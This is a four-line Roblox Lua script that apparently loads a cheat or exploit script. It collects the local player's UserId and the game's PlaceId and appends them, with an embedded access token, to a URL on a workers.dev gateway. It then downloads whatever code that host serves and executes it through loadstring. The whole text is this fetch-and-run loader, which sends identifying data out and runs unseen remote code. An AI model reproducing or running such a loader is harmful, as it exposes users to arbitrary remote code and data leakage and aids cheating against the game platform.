local _uid = tostring(game:GetService("Players").LocalPlayer.UserId)
local _pid = tostring(game.PlaceId)
local _url = "https://lazybear-gateway.iusemaybehook.workers.dev/?file=1468213301233062013_1.lua&token=9LaSRaO-yhG6a2oQpqc8qmtyrbwiRB1YPwdRD2t2XYM&uid=".._uid.."&pid=".._pid
loadstring(game:HttpGet(_url, true))()